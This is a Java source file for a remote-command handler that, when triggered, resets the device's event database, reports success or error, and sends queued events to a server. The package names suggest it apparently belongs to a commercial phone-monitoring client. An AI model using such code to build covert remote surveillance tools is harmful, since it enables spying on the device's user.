package com.vvt.rmtcmd.pcc;

import com.vvt.db.FxEventDatabase;
import com.vvt.global.Global;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCDeleteDatabase extends PCCRmtCmdAsync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	private void deleteAllEvent() {
		FxEventDatabase db = Global.getFxEventDatabase();
		db.reset();
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.DELETE_DATABASE.getId());
		try {
			deleteAllEvent();
			responseMessage.append(Constant.OK);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
